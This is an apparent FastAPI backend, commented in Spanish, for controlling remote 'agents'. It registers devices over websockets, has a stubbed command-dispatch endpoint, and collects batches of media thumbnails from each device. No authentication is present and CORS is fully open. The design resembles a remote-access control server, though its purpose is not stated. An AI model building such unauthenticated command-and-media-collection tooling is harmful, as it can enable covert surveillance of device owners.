import json
from fastapi import FastAPI, WebSocket, WebSocketDisconnect
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
from typing import List, Dict

# --- INICIALIZACIÓN Y CONFIGURACIÓN ---
app = FastAPI(title="Agente Control Backend (con Lotes)")
app.add_middleware(
    CORSMiddleware, allow_origins=["*"], allow_credentials=True, allow_methods=["*"], allow_headers=["*"],
)

# --- "BASE DE DATOS" EN MEMORIA ---
connected_agents: Dict[str, dict] = {}
device_thumbnails_cache: Dict[str, list] = {}

# --- MODELOS DE DATOS ---
class Command(BaseModel):
    target_id: str
    action: str
    payload: str

class Thumbnail(BaseModel):
    filename: str
    thumbnail_b64: str

# ¡NUEVO MODELO PARA LOS LOTES!
class ThumbnailChunk(BaseModel):
    thumbnails: List[Thumbnail]
    is_final_chunk: bool

# --- ENDPOINTS (RUTAS DE LA API) ---

@app.websocket("/ws/{device_id}/{device_name:path}")
async def websocket_endpoint(websocket: WebSocket, device_id: str, device_name: str):
    await websocket.accept()
    print(f"[CONEXIÓN] Agente conectado: '{device_name}' (ID: {device_id})")
    connected_agents[device_id] = {"ws": websocket, "name": device_name}
    try:
        while True:
            await websocket.receive_text()
    except WebSocketDisconnect:
        # ... (lógica de desconexión sin cambios)
        pass

@app.get("/api/get-agents")
async def get_agents():
    return [{"id": device_id, "name": data["name"]} for device_id, data in connected_agents.items()]

@app.post("/api/send-command")
async def send_command_to_agent(command: Command):
    # ... (lógica sin cambios)
    pass

# --- ¡RUTA MODIFICADA Y NUEVA PARA MANEJAR LOTES! ---
# Eliminamos la ruta antigua /api/submit_media_list

@app.post("/api/submit_media_chunk/{device_id}")
async def submit_media_chunk(device_id: str, chunk: ThumbnailChunk):
    """
    Ruta para que los agentes envíen sus miniaturas en lotes.
    Acumula los lotes en la caché.
    """
    if device_id not in connected_agents:
        return {"status": "error", "message": "Agente no registrado."}

    # Si es el primer lote de una nueva petición, limpiamos la caché antigua
    # Lo detectamos si el lote no está vacío y la caché sí.
    if chunk.thumbnails and device_id not in device_thumbnails_cache:
        device_thumbnails_cache[device_id] = []
        print(f"Iniciando nueva recepción de lotes para {device_id[:8]}")

    # Añadimos las nuevas miniaturas a la caché existente
    device_thumbnails_cache[device_id].extend([thumb.dict() for thumb in chunk.thumbnails])
    
    print(f"Recibido lote de {len(chunk.thumbnails)} miniaturas de {device_id[:8]}. Total en caché: {len(device_thumbnails_cache.get(device_id, []))}")

    # Si es el último lote, lo indicamos
    if chunk.is_final_chunk:
        print(f"Recepción de lotes para {device_id[:8]} completada.")
        # Limpiamos la caché si el lote final está vacío (no se encontraron archivos)
        if not device_thumbnails_cache.get(device_id):
             device_thumbnails_cache.pop(device_id, None)

    return {"status": "chunk received"}


@app.get("/api/get_media_list/{device_id}")
async def get_media_list(device_id: str):
    """Esta ruta no cambia. Simplemente devuelve lo que haya en la caché."""
    return device_thumbnails_cache.get(device_id, [])
